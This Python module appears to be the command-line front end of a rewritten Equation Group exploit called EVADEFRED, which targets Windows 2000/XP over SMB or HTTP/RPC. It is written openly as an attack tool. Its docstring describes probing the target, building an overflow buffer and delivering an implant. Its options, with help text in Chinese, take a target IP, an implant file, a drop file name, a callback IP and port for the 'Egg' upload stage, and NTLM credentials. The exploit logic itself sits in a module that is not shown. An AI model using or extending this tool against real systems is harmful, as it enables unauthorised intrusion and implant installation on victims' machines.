#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
evfr — EVADEFRED (EVFR 3.2.0.2) multi-protocol exploit.

Python rewrite of `EVFR.exe` recovered from
`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Exploits/EVFR 3.2.0.2/EVFR.exe`.

EVADEFRED is a multi-protocol exploit tool targeting Windows 2000 / Windows XP
systems.  It:

  1. Connects to the target over SMB (named pipe) or HTTP/RPC,
  2. Performs Touch #1 (vulnerability probe) or Touch #2 (language detection),
  3. Builds a language- and OS-specific overflow buffer,
  4. Sends the exploit payload carrying an implant or shellcode,
  5. Optionally handles an Egg callback for implant upload.

Recovered strings from the binary identify it as "EVADEFRED":
  - "EVADEFRED REQUIRED OPTIONS" / "EVADEFRED OPTIONAL OPTIONS"
  - Target language list (Turkish, Chinese, Swedish, Spanish, Russian, ...)
  - "Windows 2000 5.0" / "Windows 2000 2195" / "Windows XP"
  - SMB dialect strings (NT LM 0.12, LANMAN2.1, ...)
  - "httprpc"
  - "Egg will reuse existing exploit socket."
  - "Egg will callback to upload implant code."
  - Authentication: "NTLM" / "Basic" / "No Authentication"
  - File type: "DLL" / "EXE"
  - Touch #1 / Touch #2 / Exploit run options

The original binary is a Win32 console tool (~150 KB) importing KERNEL32,
WS2_32 and MSVCRT, driving raw TCP sockets directly.

CLI mirrors the original argument block:

  evfr -i <TargetIP> -p <TargetPort> -r <RunOption> [-b <TargetLanguage>]
       [-t <TargetTransportProtocol>] [-B <TargetApplicationLayerProtocol>]
       [-f <ImplantPayloadFile>] [-l <ListeningPostDll>]
       [-x <FileType: DLL|EXE>] [-q <DropFileName>]
       [-o <Timeout>] [-c <ImplantSocketOption>]
       [-u <EggSocketOption>] [-I <EggCallbackIp>] [-P <EggCallbackPort>]
       [-A <AuthType: None|Basic|NTLM>] [-U <Username>] [-W <Password>]

run_option: 1 = Touch #1 (vulnerability), 2 = Touch #2 (language), 3 = Exploit
target_transport_protocol: 1 = Port 139/445 over Named Pipes (XP SP<2)
                            2 = Ephemeral TCP Port
target_application_layer_protocol: SMB / HTTP/RPC
file_type: 1 = DLL, 2 = EXE
implant_socket_option: 1 = reuse existing socket, 2 = new socket
egg_socket_option: 1 = reuse existing exploit socket, 2 = egg callback
auth_type: 0 = None, 1 = Basic, 2 = NTLM
"""

from . import evfr_exp


def evfr_handle(args):
    """Run the EVADEFRED exploit against the supplied target."""
    return evfr_exp.run_function(
        target=args.target,
        port=args.port,
        run_option=args.runoption,
        language=args.language,
        transport_protocol=args.transport_protocol,
        app_layer_protocol=args.app_layer_protocol,
        implant_file=args.implant,
        listening_post=args.listening_post,
        file_type=args.filetype,
        drop_file=args.dropfile,
        timeout=args.timeout,
        implant_socket_option=args.implant_socket_option,
        egg_socket_option=args.eggsocket,
        egg_callback_ip=args.egg_ip,
        egg_callback_port=args.eggport,
        auth_type=args.authtype,
        username=args.username,
        password=args.password,
    )


def reg_subparser(subparsers):
    """Register the `evfr` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "evfr",
        help="EVADEFRED (EVFR 3.2.0.2) 多协议漏洞利用 (Win2000 / XP)",
        description="EVADEFRED (EVFR 3.2.0.2) — Equation Group 多协议漏洞利用工具，"
                    "针对 Windows 2000 / Windows XP 目标，支持 SMB 和 HTTP/RPC。"
                    "支持 Touch（探测）和 Exploit（利用）两个阶段，"
                    "可选 Egg Callback 方式上传惯例负载。",
    )
    p.add_argument(
        "-i", "--target", metavar="IP",
        required=True,
        help="目标主机 IP 地址",
    )
    p.add_argument(
        "-p", "--port", type=int, default=0, metavar="PORT",
        help="目标端口（0 = 根据传输协议自动）",
    )
    p.add_argument(
        "-r", "--runoption", type=int, choices=[1, 2, 3], default=3, metavar="OPT",
        help="运行选项：1=Touch #1 (漏洞检测)，2=Touch #2 (语言检测)，3=Exploit (默认 3)",
    )
    p.add_argument(
        "-b", "--language", metavar="LANG",
        help="目标语言（如 English, French, German, Chinese 等）",
    )
    p.add_argument(
        "-t", "--transport-protocol", type=int, choices=[1, 2], default=1, metavar="PROTO",
        help="目标传输协议：1=端口 139/445 通过命名管道 (XP SP<2)，2=临时 TCP 端口 (默认 1)",
    )
    p.add_argument(
        "-B", "--app-layer-protocol", metavar="PROTO",
        default="SMB",
        help="目标应用层协议：SMB 或 HTTP/RPC (默认 SMB)",
    )
    p.add_argument(
        "-f", "--implant", metavar="FILE",
        help="植入负载文件路径",
    )
    p.add_argument(
        "-l", "--listening-post", metavar="DLL",
        help="监听站 DLL 路径",
    )
    p.add_argument(
        "-x", "--filetype", type=int, choices=[1, 2], default=2, metavar="TYPE",
        help="文件类型：1=DLL，2=EXE (默认 2)",
    )
    p.add_argument(
        "-q", "--dropfile", metavar="NAME",
        help="目标上放置的文件名（仅 EXE 类型有效）",
    )
    p.add_argument(
        "-o", "--timeout", type=int, default=30, metavar="SEC",
        help="等待回复的秒数 (默认 30)",
    )
    p.add_argument(
        "-c", "--implant-socket-option", type=int, choices=[1, 2], default=1, metavar="OPT",
        help="惯例套接字选项：1=复用现有利用套接字，2=新建套接字 (默认 1)",
    )
    p.add_argument(
        "-u", "--eggsocket", type=int, choices=[1, 2], default=1, metavar="OPT",
        help="Egg 套接字选项：1=复用现有利用套接字，2=Egg 回连 (默认 1)",
    )
    p.add_argument(
        "-I", "--egg-ip", metavar="IP",
        help="Egg Callback 回连 IP 地址",
    )
    p.add_argument(
        "-P", "--eggport", type=int, default=0, metavar="PORT",
        help="Egg Callback 端口",
    )
    p.add_argument(
        "-A", "--authtype", type=int, choices=[0, 1, 2], default=0, metavar="TYPE",
        help="认证类型：0=None，1=Basic，2=NTLM (默认 0)",
    )
    p.add_argument(
        "-U", "--username", metavar="USER",
        help="认证用户名",
    )
    p.add_argument(
        "-W", "--password", metavar="PASS",
        help="认证密码",
    )
    p.set_defaults(func=evfr_handle)
